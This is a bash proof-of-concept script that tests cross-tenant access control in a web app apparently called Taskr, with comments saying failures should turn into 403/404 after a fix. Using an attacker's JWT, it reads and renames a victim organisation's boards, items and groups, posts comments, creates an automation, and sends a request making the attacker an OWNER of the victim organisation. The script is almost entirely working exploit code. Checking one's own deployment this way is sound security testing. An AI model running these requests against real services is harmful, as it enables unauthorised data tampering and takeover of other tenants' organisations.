#!/usr/bin/env bash
# Cross-tenant PoC — attacker's JWT against a victim org the attacker is NOT a member of.
# Before fix: all tests return 2xx. After fix: expect 403/404.
#
# Env vars required:
#   ATTACKER_JWT=<jwt cookie value>   (grab from browser on your deployed domain)
#   VICTIM_ORG, VICTIM_USER, VICTIM_BOARD, VICTIM_GROUP, VICTIM_ITEM
#     (printed by server/scripts/seed-victim.mjs)
#   BASE=https://your-deployed-domain (required — your Taskr deployment URL)

BASE="${BASE:?set BASE=https://your-deployed-domain before running}"
JWT="${ATTACKER_JWT:?set ATTACKER_JWT=... before running}"
ORG="${VICTIM_ORG:?set VICTIM_ORG=...}"
USER="${VICTIM_USER:?set VICTIM_USER=...}"
BOARD="${VICTIM_BOARD:?set VICTIM_BOARD=...}"
GROUP="${VICTIM_GROUP:?set VICTIM_GROUP=...}"
ITEM="${VICTIM_ITEM:?set VICTIM_ITEM=...}"

AUTH=(-H "Authorization: Bearer $JWT" -H "Content-Type: application/json")

hit() {
  local label="$1"; shift
  local method="$1"; shift
  local url="$1"; shift
  local body="${1:-}"
  echo "─── $label ───"
  echo "$method $url"
  if [[ -n "$body" ]]; then
    echo "body: $body"
    local resp=$(curl -s -w "\n__HTTP__%{http_code}" -X "$method" "${AUTH[@]}" -d "$body" "$url")
  else
    local resp=$(curl -s -w "\n__HTTP__%{http_code}" -X "$method" "${AUTH[@]}" "$url")
  fi
  echo "$resp" | sed 's/__HTTP__/  status=/'
  echo ""
}

echo "========================================"
echo " LIVE CROSS-TENANT POC — $BASE"
echo "========================================"
echo ""

hit "C1.read  — GET victim board"     GET   "$BASE/api/boards/$BOARD"
hit "C1.write — rename victim board"  PATCH "$BASE/api/boards/$BOARD" '{"name":"PWNED_BY_ATTACKER"}'
hit "C2.read  — GET victim item"      GET   "$BASE/api/boards/$BOARD/items/$ITEM"
hit "C2.write — rename victim item"   PATCH "$BASE/api/boards/$BOARD/items/$ITEM" '{"name":"PWNED_ITEM"}'
hit "C3.write — rename victim group"  PATCH "$BASE/api/boards/$BOARD/groups/$GROUP" '{"name":"PWNED_GROUP"}'
hit "C4.read  — list victim comments" GET   "$BASE/api/items/$ITEM/comments"
hit "C4.write — post comment"         POST  "$BASE/api/items/$ITEM/comments" '{"body":"pwned"}'
hit "C7.write — create automation on victim board" POST "$BASE/api/boards/$BOARD/automations" '{"name":"pwn","triggerType":"ITEM_CREATED","triggerConfig":{},"conditions":[],"actions":[]}'
hit "C9.write — add ATTACKER as OWNER of victim org" POST "$BASE/api/orgs/$ORG/members" "{\"email\":\"${ATTACKER_EMAIL:?set ATTACKER_EMAIL=...}\",\"role\":\"OWNER\"}"
